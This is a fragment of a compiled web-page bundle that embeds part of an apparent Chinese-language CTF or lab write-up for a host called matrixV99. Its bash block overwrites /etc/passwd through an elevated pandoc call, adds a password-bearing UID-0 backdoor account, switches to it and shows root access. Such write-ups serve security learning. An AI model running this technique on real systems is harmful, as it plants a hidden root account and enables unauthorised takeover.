\u5728\u8fd9\u91cc\u6211\u9009\u62e9\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"architect@matrixV99:~$ echo -e 'FUCK:\\$1\\$admin\\$eiO19kFjs48pgX5PoJpXm1:0:0::/root:/bin/bash\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\\npollinate:x:109:1::/var/cache/pollinate:/bin/false\\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\\narchitect:x:1000:1000:architect:/home/architect:/bin/bash\\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\\nntp:x:112:115::/nonexistent:/usr/sbin/nologin' | /usr/bin/pandoc -t plain -o  /etc/passwd\narchitect@matrixV99:~$ cat /etc/passwd\nFUCK:$1$admin$eiO19kFjs48pgX5PoJpXm1:0:0::/root:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\n......\narchitect@matrixV99:~$ su FUCK\nPassword: \nFUCK@matrixV99:/home/architect# id\nuid=0(FUCK) gid=0(root) groups=0(root)\n"})})]})}function d(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(c,{...n})}):c(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>o});var s=t(96540);const i={},a=s.createContext(i);function r(n){const e=s.useContext(a);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:r(n.components),s.createElement(a.Provider,{value:e},n.children)}}}]);